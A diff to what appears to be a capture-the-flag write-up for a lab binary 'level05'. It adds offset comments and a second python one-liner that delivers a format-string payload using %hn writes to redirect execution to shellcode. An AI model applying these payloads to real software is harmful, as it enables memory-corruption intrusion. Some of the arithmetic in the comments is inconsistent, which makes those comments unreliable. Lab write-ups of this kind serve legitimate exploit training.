@@ -78,9 +78,10 @@ $> gdb -q level05
 # to know where stock our shellcode
 # move some bytes to sure that we can get our shellcode
 # 0xffffd816 + 50 = 0xffffd848
+# (in linux (42): 0xffffd864 + 50 = 0xffffd896)
 # we need use padding of format string but 0xffffd816 is too long to stock in 4 bytes (int)
 # so we need split our address in 2 parts
-# ffff and d848
+# ffff (65535) and d848 (55368)
 ```
 
 ```shell
@@ -88,6 +89,9 @@ $> (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55360d%10\$hn' 
 
 # 55360: 55368 - 8 = 55360 (2 parts shell code address, 2 * 4)
 # 10167: 0xffff - 0xd848 = 10167 (1st part = 55468 = d848 and 2nd part = 55468 + 10167 = 0xffff)
+
+# if use linux (42)
+# $> (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55438d%10\$hn' + '%10089d%11\$hn'"; cat) | ./level05
 
 [...]
 -134415680
